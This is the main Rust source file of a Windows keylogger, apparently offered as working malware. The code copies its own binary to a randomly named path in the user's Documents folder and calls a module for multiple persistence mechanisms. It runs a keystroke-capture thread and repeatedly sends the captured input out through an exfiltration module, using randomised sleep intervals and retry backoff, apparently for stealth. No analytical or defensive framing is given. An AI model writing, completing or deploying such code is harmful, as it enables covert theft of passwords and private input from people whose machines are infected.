use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use rand::Rng;
use std::env;

mod persistence;
mod keylogger;
mod exfiltration;

fn main() {
    let exe_path = generate_random_path();
    std::fs::copy(std::env::current_exe().unwrap(), &exe_path).expect("Failed to copy binary");

    persistence::setup_multifaceted_persistence(&exe_path);

    let log = Arc::new(Mutex::new(String::new()));
    let log_clone = Arc::clone(&log);

    thread::spawn(move || keylogger::monitor_input(log_clone));

    let mut retry_attempts = 0;
    loop {
        let data = {
            let mut log = log.lock().unwrap();
            if !log.is_empty() {
                let data = log.clone();
                *log = String::new();
                Some(data)
            } else {
                None
            }
        };

        if let Some(data) = data {
            match exfiltration::transmit_data(&data) {
                Ok(_) => retry_attempts = 0,
                Err(e) => {
                    eprintln!("Error transmitting data: {}", e);
                    if is_recoverable_error(&e) {
                        retry_attempts += 1;
                        if retry_attempts > 5 {
                            break;
                        }
                    } else {
                        break;
                    }
                }
            }
        }

        let base_sleep_time = if retry_attempts == 0 {
            rand::thread_rng().gen_range(60..300) 
        } else {
            2u64.pow(retry_attempts.min(5))
        };
        let sleep_time = base_sleep_time + rand::thread_rng().gen_range(0..10); 
        thread::sleep(Duration::from_secs(sleep_time));
    }
}

fn is_recoverable_error(error: &str) -> bool {
    error.contains("network") || error.contains("timeout")
}

fn generate_random_path() -> String {
    let documents = env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Default".to_string());
    let random_name: String = rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(8)
        .map(char::from)
        .collect();
    format!("{}\\Documents\\Work\\{}", documents, random_name)
}
